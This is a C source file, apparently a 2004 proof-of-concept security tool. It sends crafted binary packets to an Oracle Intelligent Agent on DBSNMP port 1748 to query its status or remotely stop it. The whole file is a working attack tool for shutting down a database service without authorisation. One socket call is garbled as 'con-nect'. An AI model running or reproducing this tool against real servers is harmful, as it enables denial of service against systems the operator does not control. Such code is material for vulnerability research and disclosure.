#include <stdio.h>
#include <windows.h>
#include <winsock.h>
#define DBSNMPPORT 1748
int QueryDBSNMP(int in);
int StartWinsock(void);
struct sockaddr_in s_sa;
struct hostent *he;
unsigned int addr;
char host[260]="";

unsigned char Packet_1[]=
"\x00\x6A\x00\x00\x01\x00\x00\x00\x01\x38\x01\x2C\x00\x00\x08\x00"
"\x7F\xFF\x86\x0E\x00\x00\x01\x00\x00\x30\x00\x3A\x00\x00\x00\x64"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xB4\x00\x00"
"\x00\x0B\x00\x00\x00\x00\x00\x00\x00\x00\x28\x4F\x45\x4D\x5F\x4F"
"\x4D\x53\x3D\x28\x56\x45\x52\x53\x49\x4F\x4E\x3D\x28\x52\x45\x4C"
"\x45\x41\x53\x45\x3D\x39\x2E\x32\x2E\x30\x2E\x31\x2E\x30\x29\x28"
"\x52\x50\x43\x3D\x32\x2E\x30\x29\x29\x29\x54\x76\x10";
unsigned char Packet_2[]=
"\x00\x42\x00\x00\x06\x00\x00\x00\x00\x00\x28\x41\x44\x44\x52\x45"
"\x53\x53\x3D\x28\x50\x52\x4F\x54\x4F\x43\x4F\x4C\x3D\x74\x63\x70"
"\x29\x28\x48\x4F\x53\x54\x3D\x31\x36\x39\x2E\x32\x35\x34\x2E\x33"
"\x32\x2E\x31\x33\x33\x29\x28\x50\x4F\x52\x54\x3D\x31\x37\x34\x38"
"\x29\x29\x00\x3E\x00\x00\x06\x00\x00\x00\x00\x00\x20\x08\xFF\x03"
"\x01\x00\x12\x34\x34\x34\x34\x34\x78\x10\x10\x32\x10\x32\x10\x32"
"\x10\x32\x10\x32\x54\x76\x00\x78\x10\x32\x54\x76\x10\x00\x00\x80"
"\x01\x00\x00\x00\x00\x00\x84\x03\xBC\x02\x80\x02\x80\x02\x00\x00";
unsigned char Packet_3[]=
"\x00\x52\x00\x00\x06\x00\x00\x00\x00\x00\x44\x00\x00\x80\x02\x00"
"\x00\x00\x00\x04\x00\x00\xB0\x39\xD3\x00\x90\x00\x23\x00\x00\x00"
"\x44\x32\x44\x39\x46\x39\x35\x43\x38\x32\x42\x46\x2D\x30\x35\x45"
"\x44\x2D\x45\x30\x30\x30\x2D\x37\x32\x33\x30\x30\x38\x33\x31\x35"
"\x39\x42\x30\x02\x00\x30\x01\x01\x00\x01\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x1E\x00\x00\x06\x00\x00\x00\x00\x00\x10\x00\x00\x80"
"\x05\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
unsigned char Packet_4[]=
"\x00\x0A\x00\x00\x06\x00\x00\x00\x00\x40";
int main(int argc, char *argv[])
{
	int count = 56;
	if(argc != 3)
	{
		printf("\n\n\n\tOracle DBSNMP Tool\n\n\t");
		printf("C:\\>%s host status|stop",argv[0]);
		printf("\n\n\tDavid Litchfield\n\t");
		printf("davidl@ngssoftware.com");
		printf("\n\t4th June 2004\n\n\n\n");
		return 0;
	}
	strncpy(host,argv[1],250);
	if(!StartWinsock())
		return printf("Error starting Winsock.\n");
	if(stricmp(argv[2],"status")==0)
	{
		printf("\n\nStatus...\n\n");
		Packet_3[69] = 0x38;
	}
	if(stricmp(argv[2],"stop")==0)
	{
		printf("\n\nStopping...\n\n");
		Packet_3[69] = 0x37;
	}
	QueryDBSNMP(Packet_3[69]);
	WSACleanup();	
	return 0;
}		

int StartWinsock()
{
	int err=0;
	WORD wVersionRequested;
	WSADATA wsaData;
	wVersionRequested = MAKEWORD( 2, 0 );
	err = WSAStartup( wVersionRequested, &wsaData );
	if (err != 0)
		return 0;
	if (LOBYTE(wsaData.wVersion) !=2 || HIBYTE(wsaData.wVersion) !=0)
  	{
		WSACleanup();
		return 0;
	}
	if (isalpha(host[0]))
	{
		he = gethostbyname(host);
		s_sa.sin_addr.s_addr=INADDR_ANY;
		s_sa.sin_family=AF_INET;
		memcpy(&s_sa.sin_addr,he->h_addr,he->h_length);
  	}
	else
	{
		addr = inet_addr(host);
		s_sa.sin_addr.s_addr=INADDR_ANY;
		s_sa.sin_family=AF_INET;
		memcpy(&s_sa.sin_addr,&addr,4);
		he = (struct hostent *)1;
	}
	if (he == NULL)
		return 0;
	return 1;
}

int QueryDBSNMP(int in)
{
	unsigned char resp[1600]="";
	int snd=0,rcv=0,count=0;
	unsigned int ttlbytes=0;
	unsigned int to=2000;
	struct sockaddr_in cli_addr;
	SOCKET cli_sock;
	cli_sock=socket(AF_INET,SOCK_STREAM,0);
	if (cli_sock==INVALID_SOCKET)
	{
		printf("socket error.\n");
		return 0;
    	}
	cli_addr.sin_family=AF_INET;
	cli_addr.sin_addr.s_addr=INADDR_ANY;        
	cli_addr.sin_port=htons((unsigned short)0);
//	setsockopt(cli_sock,SOL_SOCKET,SO_RCVTIMEO,(char *)&to,sizeof(unsigned int));
	if (bind(cli_sock,(LPSOCKADDR)&cli_addr,sizeof(cli_addr))==SOCKET_ERROR)
	{
		closesocket(cli_sock);
		printf("bind error");
		return 0;
    	}
	s_sa.sin_port=htons((unsigned short)DBSNMPPORT);
	if (con-nect(cli_sock,(LPSOCKADDR)&s_sa,sizeof(s_sa))==SOCKET_ERROR)
	{
		closesocket(cli_sock);
		printf("Connect error");
		return 0;
	}
	snd=send(cli_sock, Packet_1 , 0x6A , 0);
	rcv = recv(cli_sock,resp,1500,0);
	if(rcv == SOCKET_ERROR)
	{
		closesocket(cli_sock);
		printf("recv error.\n");
		return 0;
	}
	PrintResponse(rcv,resp);
	snd=send(cli_sock, Packet_2 , 0x80 , 0);
	rcv = recv(cli_sock,resp,1500,0);
	if(rcv == SOCKET_ERROR)
	{
		closesocket(cli_sock);
		printf("recv error.\n");
		return 0;
	}
	PrintResponse(rcv,resp);
	snd=send(cli_sock, Packet_3 , 0x70 , 0);
	rcv = recv(cli_sock,resp,1500,0);
	if(rcv == SOCKET_ERROR)
	{
		closesocket(cli_sock);
		printf("recv error.\n");
		return 0;
	}
	PrintResponse(rcv,resp);
	if(in == 0x37)
	{
		closesocket(cli_sock);
		return printf("Oracle Intelligent Agent has stopped");
	}
	snd=send(cli_sock, Packet_4 , 0x0A , 0);
	rcv = recv(cli_sock,resp,1500,0);
	if(rcv == SOCKET_ERROR)
	{
		closesocket(cli_sock);
		printf("recv error.\n");
		return 0;
	}
	closesocket(cli_sock);
	return 0;
}
int PrintResponse(int size, unsigned char *ptr)
{
	int count = 0;
	int chk = 0;
	int sp = 0;
	printf("%.4X   ",count);
	while(count < size)
	{
		if(count % 16 == 0 && count > 0)
		{
			printf("   ");
			chk = count;
			count = count - 16;
			while(count < chk)
			{
				if(ptr[count]<0x20)
					printf(".");
				else
					printf("%c",ptr[count]);
				count ++;
			}
			printf("\n%.4X   ",count);
		}
		printf("%.2X ",ptr[count]);
		count ++;
	}
	count = count - chk;
	count = 17 - count;
	while(sp < count)
	{
		printf("   ");
		sp++;
	}
	count = chk;
	while(count < size)
	{
		if(ptr[count]<0x20)
			printf(".");
		else
			printf("%c",ptr[count]);
		count ++;
	}
	printf("\n\n\n\n");
	return 0;
}
